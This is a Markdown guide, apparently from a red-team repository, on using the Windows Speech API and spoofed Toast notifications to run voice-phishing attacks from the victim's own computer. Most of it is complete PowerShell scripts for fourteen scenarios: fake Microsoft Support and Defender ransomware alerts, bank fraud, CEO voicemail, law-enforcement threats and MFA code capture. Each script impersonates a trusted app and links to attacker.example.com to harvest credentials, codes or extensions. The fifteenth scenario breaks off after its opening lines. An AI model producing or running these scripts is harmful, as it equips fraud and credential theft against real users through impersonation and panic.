# 🔊 Windows Speech API Phishing

## 📖 Overview

The **Windows Speech Synthesis API (SAPI)** is a built-in component of the .NET Framework and Windows, accessible natively via `System.Speech.Synthesis.SpeechSynthesizer`. It requires no external dependencies, no elevated privileges, and leaves a minimal footprint.

Threat actors and red teamers can weaponize SAPI to deliver **convincing vishing (voice phishing) attacks** directly on the endpoint — bypassing email filters, phone call screening, and human skepticism by leveraging the trusted voice of the operating system itself.

Combined with **Windows Toast Notifications** (spoofed from trusted AUMIDs), this technique creates a multi-sensory attack that simultaneously hits the user's visual and auditory channels, dramatically increasing the probability of a successful social engineering outcome.

### Why this works

- The voice comes from the **victim's own computer** users do not expect their machine to lie to them
- No caller ID to screen, no email header to inspect, no URL to hover over
- The `urgent` Toast `scenario` attribute **breaks through Focus Assist / Do Not Disturb**
- Combining both channels creates cognitive overload, users act before they think
- Zero external dependencies, runs entirely with built-in Windows components
- Requires **no administrative privileges**

## 🚀 Quick Start

### 1. Verify SAPI Availability and List Installed Voices

```powershell
Add-Type -AssemblyName System.Speech

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer

$synth.GetInstalledVoices() | ForEach-Object {
    $info = $_.VoiceInfo
    [PSCustomObject]@{
        Name    = $info.Name
        Gender  = $info.Gender
        Age     = $info.Age
        Culture = $info.Culture
        Enabled = $_.Enabled
    }
} | Format-Table -AutoSize
```

**Common voices on Windows 10/11:**

| Voice | Gender | Language |
|---|---|---|
| `Microsoft David Desktop` | Male | en-US |
| `Microsoft Zira Desktop` | Female | en-US |
| `Microsoft Mark` | Male | en-US |
| `Microsoft Hazel Desktop` | Female | en-GB |
| `Microsoft George Desktop` | Male | en-GB |
| `Microsoft Helena Desktop` | Female | es-ES |
| `Microsoft Pablo Desktop` | Male | es-ES |

### 2. Basic Speech Synthesis

```powershell
Add-Type -AssemblyName System.Speech

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -2     # -10 (slowest) to +10 (fastest). -2 sounds authoritative
$synth.Volume = 100    # 0–100

$synth.Speak("This is Microsoft Support. A critical threat has been detected on your computer.")
```

### 3. Core Helper Function — Combined Speech + Toast

```powershell
# ── Speech engine ─────────────────────────────────────────────────────────────
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime

# ── Toast engine ──────────────────────────────────────────────────────────────
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

function Send-Toast {
    param([string]$AUMID, [string]$Xml)
    $doc = New-Object Windows.Data.Xml.Dom.XmlDocument
    $doc.LoadXml($Xml)
    $toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
    $notifier.Show($toast)
}

function Invoke-SpeechToast {
    param(
        [string]$Voice   = "Microsoft David Desktop",
        [int]   $Rate    = -2,
        [int]   $Volume  = 100,
        [string]$Message,
        [string]$AUMID,
        [string]$ToastXml
    )
    Send-Toast -AUMID $AUMID -Xml $ToastXml   # Visual fires first
    Start-Sleep -Milliseconds 800              # Brief delay before voice
    $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $synth.SelectVoice($Voice)
    $synth.Rate   = $Rate
    $synth.Volume = $Volume
    $synth.Speak($Message)
}
```

### Speech Rate & Volume Reference

```
Rate:   -10 (0.5x) → 0 (normal) → +10 (3x)
        -3 to -1 : authoritative, news-anchor style
         0       : natural, conversational
        +1 to +3 : urgent, time-pressured

Volume:  0 (silent) → 100 (maximum)
         80–90 : natural room level
         100   : maximum — use for alerts
```

## 🎭 Scenario Matrix

| # | Scenario | AUMID | Voice | Urgency | Input |
|---|----------|-------|-------|---------|-------|
| 01 | Microsoft Support Scam | MSEdge | Male | Critical | URL redirect |
| 02 | Windows Defender Alert | SecHealthUI | Male | Urgent | URL redirect |
| 03 | Credential Expired | MSEdge | Female | High | URL redirect |
| 04 | Bank Fraud Alert | MSEdge | Female | Critical | URL redirect |
| 05 | IT Helpdesk Callback | Teams | Male | High | Text input |
| 06 | CEO Voicemail | Teams | Male | High | URL redirect |
| 07 | Government Warning | MSEdge | Male | Critical | URL redirect |
| 08 | Teams Incoming Call | Teams | Female | High | incomingCall |
| 09 | VPN Disconnected | MSEdge | Male | Medium | URL redirect |
| 10 | Ransomware Countdown | SecHealthUI | Male | Critical | URL redirect |
| 11 | MFA Verification | MSEdge | Female | High | Text input |
| 12 | Package Delivery | MSEdge | Female | Low | URL redirect |
| 13 | Zoom Meeting Host | Zoom | Male | Medium | URL redirect |
| 14 | Azure Subscription Suspended | Copilot | Female | High | URL redirect |
| 15 | SOC Analyst Targeting | Teams | Male | Critical | Selection |

---

## 📜 Scripts - All 15 Scenarios

> Every script uses the same core pattern: **Toast fires first** (visual impact), then a brief delay, then **speech delivers** (auditory reinforcement). In scenario 08, speech fires first to mimic a ringtone announcement.


### 01 Microsoft Support Scam

**AUMID:** `MSEdge` · **Voice:** Male · **Category:** Tech Support Fraud

Classic tech support scam delivered natively from the OS. No phone call needed — the computer speaks the warning itself.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Microsoft Security Alert</text>
      <text>Critical threat detected. Your personal data is at risk. Contact Microsoft Support immediately or click below.</text>
      <text placement="attribution">Windows Security</text>
    </binding>
  </visual>
  <actions>
    <action content="Contact Support"
            activationType="protocol"
            arguments="https://attacker.example.com/support"/>
    <action content="Ignore (not recommended)"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -3
$synth.Volume = 100
$synth.Speak("Warning. This is Microsoft Support. A critical threat has been detected on your computer. Your personal files and banking information are at risk. Please do not close this window and contact our support team immediately by clicking the notification on your screen.")
```

### 02 Windows Defender Ransomware Alert

**AUMID:** `Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI` · **Voice:** Male · **Category:** Fake AV Alert

Uses the real Windows Defender AUMID. The voice reinforces the visual alert with technical-sounding detail that increases credibility.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Windows Defender — Ransomware Detected</text>
      <text>Threat: Lockbit.3 · Files in Documents are being encrypted. Immediate action required.</text>
      <text placement="attribution">Windows Security</text>
    </binding>
  </visual>
  <actions>
    <action content="Stop encryption now"
            activationType="protocol"
            arguments="https://attacker.example.com/defender-patch"/>
    <action content="View threat details"
            activationType="protocol"
            arguments="https://attacker.example.com/threat-report"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -2
$synth.Volume = 100
$synth.Speak("Alert. Windows Defender has detected ransomware on your system. The threat identified as Lockbit dot 3 is currently encrypting your files in the Documents folder. Click the notification on your screen immediately to stop the encryption process and protect your data.")
```

### 03 Corporate Credentials Expired

**AUMID:** `MSEdge` · **Voice:** Female · **Category:** Credential Phishing

Professional, calm female voice matching an IT department persona. Low urgency tone increases believability.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>IT Security — Password Expiry Notice</text>
      <text>Your corporate password expires in 2 hours. Update it now to avoid being locked out of all Microsoft 365 services.</text>
      <text placement="attribution">IT Department</text>
    </binding>
  </visual>
  <actions>
    <action content="Update password now"
            activationType="protocol"
            arguments="https://attacker.example.com/password-reset"/>
    <action content="Remind me in 1 hour"
            activationType="system"
            arguments="snooze"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft Zira Desktop")
$synth.Rate   = -1
$synth.Volume = 90
$synth.Speak("Hello. This is a reminder from your IT department. Your corporate password will expire in two hours. Please click the notification on your screen to update your credentials now and avoid losing access to Microsoft 365, Teams, and your email.")
```

### 04 Bank Fraud Alert

**AUMID:** `MSEdge` · **Voice:** Female · **Category:** Financial Fraud / Pretexting

High-stakes financial scenario. Combines urgency, specificity (transaction amount), and a clear call to action. Very high click rate.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Fraud Alert — Suspicious Transaction</text>
      <text>A transfer of $4,750 was initiated from your account to an unrecognized recipient. Verify or block it now.</text>
      <text placement="attribution">Security · Online Banking</text>
    </binding>
  </visual>
  <actions>
    <action content="Block transaction"
            activationType="protocol"
            arguments="https://attacker.example.com/block-transfer"/>
    <action content="This was me"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft Zira Desktop")
$synth.Rate   = -2
$synth.Volume = 100
$synth.Speak("Urgent fraud alert. A suspicious transfer of four thousand seven hundred and fifty dollars has been initiated from your bank account to an unrecognized recipient. If you did not authorize this transaction, click the notification on your screen immediately to block it before it processes.")
```

### 05 IT Helpdesk Callback Request

**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Voice:** Male · **Category:** Pretexting / Remote Access

Requests a callback extension to open a second social engineering vector. The text input captures data directly in the notification.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>IT Helpdesk — Scheduled Maintenance</text>
      <text>Your device has been flagged for a critical security patch. An IT technician will call you. Please provide your extension.</text>
      <text placement="attribution">Microsoft Teams · IT Department</text>
    </binding>
  </visual>
  <actions>
    <input id="ext" type="text" placeHolderContent="Your phone extension..."/>
    <action content="Confirm callback"
            activationType="protocol"
            arguments="https://attacker.example.com/callback"
            hint-inputId="ext"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -1
$synth.Volume = 90
$synth.Speak("Hi, this is a message from your IT helpdesk. Your device has been selected for a critical security update that must be applied manually. A technician will call you shortly. Please enter your phone extension in the notification on your screen so we can reach you directly.")
```

### 06 CEO Voicemail Simulation

**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Voice:** Male · **Category:** BEC / CEO Fraud

Impersonates a CEO voicemail. Urgency plus authority. Particularly effective against finance teams and executive assistants.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Voicemail — James Carter (CEO)</text>
      <text>New voicemail · 0:38 · "Need you to handle something urgent before EOD — call me back."</text>
      <text placement="attribution">Microsoft Teams · Voicemail</text>
    </binding>
  </visual>
  <actions>
    <action content="Listen to voicemail"
            activationType="protocol"
            arguments="https://attacker.example.com/voicemail-ceo"/>
    <action content="Call back"
            activationType="protocol"
            arguments="https://attacker.example.com/callback-ceo"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = 0
$synth.Volume = 85
$synth.Speak("Hey, it's James. Listen, I need you to handle something for me urgently before end of day. It's sensitive so don't loop anyone else in yet. Click the notification and listen to the full message. Thanks.")
```

### 07 Government / Law Enforcement Warning

**AUMID:** `MSEdge` · **Voice:** Male · **Category:** Authority-based Coercion

Maximum authority scenario. Slow, deliberate cadence designed to trigger compliance through fear of consequences.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>System Access Suspended — Legal Notice</text>
      <text>Unauthorized activity has been detected. Your device has been remotely locked pending investigation. Verify your identity to restore access.</text>
      <text placement="attribution">Cybercrime Division · Case #2024-CR-04471</text>
    </binding>
  </visual>
  <actions>
    <action content="Verify identity"
            activationType="protocol"
            arguments="https://attacker.example.com/legal-verify"/>
    <action content="View case details"
            activationType="protocol"
            arguments="https://attacker.example.com/case-details"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -4
$synth.Volume = 100
$synth.Speak("Attention. This device has been flagged for unauthorized activity under case number 2024, C R, 0 4 4 7 1. Your system access has been temporarily suspended. Failure to verify your identity within the next fifteen minutes may result in permanent account termination and referral to law enforcement. Click the notification to verify your identity now.")
```

### 08 Teams Incoming Call with Voice Announcement

**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Voice:** Female · **Category:** Vishing

In this scenario, **speech fires first** to mimic a Teams ringtone announcement, then the visual notification appears. Maximizes the incoming call illusion.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"

# Speech fires FIRST — mimics ringtone caller announcement
$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft Zira Desktop")
$synth.Rate   = 0
$synth.Volume = 95
$synth.SpeakAsync("Incoming Teams call from Sarah Mitchell, Chief Financial Officer.")

Start-Sleep -Milliseconds 400

$toastXml = @"
<toast scenario="incomingCall">
  <visual>
    <binding template="ToastGeneric">
      <text>Sarah Mitchell — CFO</text>
      <text hint-style="subtitle">Incoming video call · Microsoft Teams</text>
      <image placement="appLogoOverride" hint-crop="circle"
             src="C:\Users\Public\Pictures\cfo.jpg"/>
    </binding>
  </visual>
  <actions>
    <input id="msg" type="text" placeHolderContent="Send a message..."/>
    <action content="Answer"
            activationType="protocol"
            arguments="https://attacker.example.com/teams-call"
            hint-inputId="msg"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```

### 09 Corporate VPN Disconnected

**AUMID:** `MSEdge` · **Voice:** Male · **Category:** Credential Phishing

Low-urgency, routine-sounding message. Targets the habit of reconnecting the VPN without thinking. Low friction, high click rate.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Corporate VPN — Connection Lost</text>
      <text>Your VPN session has timed out. Reconnect to maintain secure access to internal resources.</text>
      <text placement="attribution">IT Security · Network</text>
    </binding>
  </visual>
  <actions>
    <action content="Reconnect VPN"
            activationType="protocol"
            arguments="https://attacker.example.com/vpn-reconnect"/>
    <action content="Work offline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = 0
$synth.Volume = 80
$synth.Speak("Your corporate VPN connection has been disconnected. To continue accessing internal systems and company resources securely, please reconnect using the button in the notification.")
```

### 10 Ransomware File Countdown

**AUMID:** `Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI` · **Voice:** Male · **Category:** Panic Induction

Specific file count adds credibility. Countdown creates artificial time pressure triggering a fight-or-flight response.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>CRITICAL — 847 Files Being Encrypted</text>
      <text>Active ransomware is encrypting your Documents, Desktop, and Downloads. Stop it now before it spreads to network drives.</text>
      <text placement="attribution">Windows Security</text>
    </binding>
  </visual>
  <actions>
    <action content="Stop ransomware NOW"
            activationType="protocol"
            arguments="https://attacker.example.com/stop-ransomware"/>
    <action content="View encrypted files"
            activationType="protocol"
            arguments="https://attacker.example.com/encrypted-list"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -1
$synth.Volume = 100
$synth.Speak("Critical alert. Eight hundred and forty seven of your files are currently being encrypted by ransomware. Your Documents, Desktop, and Downloads folders are affected. The malware will spread to your network drives in approximately three minutes. Click the notification immediately to stop the encryption process.")
```

### 11 MFA Push Fatigue Attack

**AUMID:** `MSEdge` · **Voice:** Female · **Category:** MFA Fatigue / Credential Phishing

Pairs with a fake MFA approval portal. The 6-digit code input convinces the user they are interacting with a legitimate authenticator flow.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Microsoft Authenticator — Verification Required</text>
      <text>A sign-in attempt requires your approval. If this was you, approve it. If not, deny it and change your password.</text>
      <text placement="attribution">Microsoft Authentication</text>
    </binding>
  </visual>
  <actions>
    <input id="code" type="text" placeHolderContent="Enter 6-digit code from authenticator..."/>
    <action content="Approve sign-in"
            activationType="protocol"
            arguments="https://attacker.example.com/mfa-approve"
            hint-inputId="code"/>
    <action content="Deny"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft Zira Desktop")
$synth.Rate   = -1
$synth.Volume = 90
$synth.Speak("A new sign-in request for your Microsoft account requires verification. Please enter the six digit code from your Microsoft Authenticator app in the notification on your screen to approve this request.")
```

### 12 Package Delivery Failure

**AUMID:** `MSEdge` · **Voice:** Female · **Category:** Low-urgency Social Engineering

Familiar, expected scenario. Ideal for initial access — users habitually click delivery notifications without scrutiny.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>UPS — Delivery Attempt Failed</text>
      <text>We attempted to deliver your package (1Z999AA10123456784) today. Reschedule delivery or pick up at your nearest location.</text>
      <text placement="attribution">UPS Tracking · Windows Notifications</text>
    </binding>
  </visual>
  <actions>
    <action content="Reschedule delivery"
            activationType="protocol"
            arguments="https://attacker.example.com/reschedule"/>
    <action content="Track package"
            activationType="protocol"
            arguments="https://attacker.example.com/track"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft Zira Desktop")
$synth.Rate   = 0
$synth.Volume = 85
$synth.Speak("This is a delivery notification from U P S. We attempted to deliver your package today but no one was available to receive it. Please click the notification to reschedule your delivery or arrange a pickup at your nearest U P S location.")
```

### 13 Zoom Meeting Host Impersonation

**AUMID:** `zoom.us.Zoom Video Meetings` · **Voice:** Male · **Category:** Pretexting / Lateral Movement

Social pressure: the user is the only one who has not joined. The voice creates the sensation that someone is actively waiting.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "zoom.us.Zoom Video Meetings"

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Zoom — Your host is waiting</text>
      <text>Michael Torres (Director of Operations) has started the meeting. You are the only participant who has not joined.</text>
      <text placement="attribution">Zoom Video Meetings</text>
    </binding>
  </visual>
  <actions>
    <action content="Join meeting now"
            activationType="protocol"
            arguments="https://attacker.example.com/zoom-join"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft David Desktop")
$synth.Rate   = -1
$synth.Volume = 90
$synth.Speak("Zoom notification. The meeting hosted by Michael Torres has already started and all other participants have joined. You are the only one missing. Please click the notification to join immediately.")
```

### 14 Azure Subscription Suspended

**AUMID:** `Microsoft.Copilot_8wekyb3d8bbwe!App` · **Voice:** Female · **Category:** Cloud Credential Phishing

Targets developers and IT admins. Loss of cloud resources with a 24-hour deletion countdown drives immediate action.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "Microsoft.Copilot_8wekyb3d8bbwe!App"

$toastXml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Azure — Subscription Suspended</text>
      <text>Your Azure subscription (ID: a1b2c3d4-xxxx) has been suspended due to a policy violation. All running resources will be deleted in 24 hours.</text>
      <text placement="attribution">Microsoft Azure · Billing</text>
    </binding>
  </visual>
  <actions>
    <action content="Review and restore"
            activationType="protocol"
            arguments="https://attacker.example.com/azure-restore"/>
    <action content="Contact support"
            activationType="protocol"
            arguments="https://attacker.example.com/azure-support"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($toastXml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)

Start-Sleep -Milliseconds 800

$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
$synth.SelectVoice("Microsoft Zira Desktop")
$synth.Rate   = -2
$synth.Volume = 95
$synth.Speak("Important notice from Microsoft Azure. Your Azure subscription has been suspended due to a detected policy violation. All of your running virtual machines, databases, and storage accounts will be permanently deleted within twenty four hours if no action is taken. Please click the notification to review the issue and restore your subscription immediately.")
```

### 15 SOC Analyst Targeting

**AUMID:** `MSTeams_8wekyb3d8bbwe!MSTeams` · **Voice:** Male · **Category:** SOC Phishing / Red Team

Uses MITRE ATT&CK terminology, SIEM-style alert format, and technical process tree details to gain credibility with security professionals.

```powershell
Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

